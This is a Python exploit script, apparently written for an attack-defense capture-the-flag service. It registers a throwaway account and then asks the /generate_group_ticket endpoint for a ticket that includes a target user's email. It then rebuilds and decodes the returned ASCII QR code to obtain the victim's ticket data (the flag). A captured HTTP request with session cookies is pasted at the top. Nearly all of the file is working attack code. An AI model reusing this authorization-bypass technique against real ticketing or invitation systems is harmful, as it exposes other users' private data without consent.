#!/usr/bin/env python3

# POST /generate_group_ticket HTTP/2
# Host: 10.32.66.2:8000
# Cookie: last=GI+uqBjPLWFBFp1IzcxhqQbBtpy6DU0gl3KRFfJm2By9QKFcD0yZEVTD+Pq7zSKRd8a23TS597Jprq5oYcRraTAhLB8yvOdg0Co%3D; first=KhFX5yaAEwsnam4iKFTT0WTwdFFFBgVDt4TjTrr5U2bkRCpz0aHm%2F+E824WaH8L1t5sR13+Jni3VKTIlg1bkS00RY6%2FgOekfCco%3D; email=YppDJGPpR8u2UzYsTNvPGDwkTL9WEDXaOjy4sSFfigCaQZbPYLz1wK9uOI5hsKL3IFl61izuvEELGmh9B3yQ6kgZb8a6WfICNHI%3D; username=cBLeZF6974LU+6gstfQTKjkEPxr58J2YsED%2FZKdj4cm92MGzWwkrGPH7R%2F5j9HV2HXACdBTdBjT%2FXb0a8jf9XE3dNjB3ybHwouw%3D
# User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:100.0) Gecko/20100101 Firefox/100.0
# Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
# Accept-Language: en
# Accept-Encoding: gzip, deflate
# Dnt: 1
# Content-Type: application/x-www-form-urlencoded
# Referer: https://10.32.66.2:8000/stops/
# Upgrade-Insecure-Requests: 1
# Sec-Fetch-Dest: document
# Sec-Fetch-Mode: navigate
# Sec-Fetch-Site: same-origin
# Sec-Fetch-User: ?1
# Sec-Gpc: 1
# Te: trailers
# Content-Length: 83
#
# friends[]=kjaskfjsakjflkjflksajfsdjfdsfsj@mailinator.com&friends[]=asdf@example.com
# asdf@example.com = flag id
# kjaskfjsakjflkjflksajfsdjfdsfsj@mailinator.com = self-registered

ip="10.32.1.2"

HOST="https://"+ip+":8000"
targetEmail = "lushdeafeninghorror1746@efficientheat6036.com"

import string
import random

letters = string.ascii_lowercase
username = ''.join(random.choice(letters) for i in range(20))
password = ''.join(random.choice(letters) for i in range(20))

email=username + "@" + password + ".at"

import requests
import re
import bs4

s = requests.Session()
resp = s.post(HOST + "/register", data={"username": username, "first": "asb", "last": "my", "email": email, "password": password}, verify=False)

resp = s.post(HOST + "/generate_group_ticket", data={"friends": [email, targetEmail]}, verify=False)

soup = bs4.BeautifulSoup(resp.text, 'html.parser')
c = soup.find("code")

arr = []

lines = c.contents[0].split("\n")[2:-2]
for l in lines:
    cols = [[], []]
    print(l[2:])
    for ch in l[2:]:
        if ch == " ":
            cols[0].append(255)
            cols[1].append(255)
        elif ch == "█":
            cols[0].append(0)
            cols[1].append(0)
        elif ch == "▀":
            cols[0].append(0)
            cols[1].append(255)

        elif ch == "▄":
            cols[0].append(255)
            cols[1].append(0)
        else:
            raise ValueError("unknown")
    arr.append(cols[0])
    arr.append(cols[1])

from PIL import Image
import numpy as np

filename = "qr.png"
Image.fromarray(np.array(arr).astype('uint8'), mode='L').save(filename)

import cv2
# Name of the QR Code Image file
# read the QRCODE image
image = cv2.imread(filename)
image = cv2.resize(image, (400,400), interpolation = cv2.INTER_AREA)
cv2.imshow("img", image)
cv2.waitKey(0)
cv2.destroyAllWindows()


# initialize the cv2 QRCode detector
detector = cv2.QRCodeDetector()
# detect and decode
data, vertices_array, binary_qrcode = detector.decode(image, [])

print("data", data)
print(detector.detect(image))
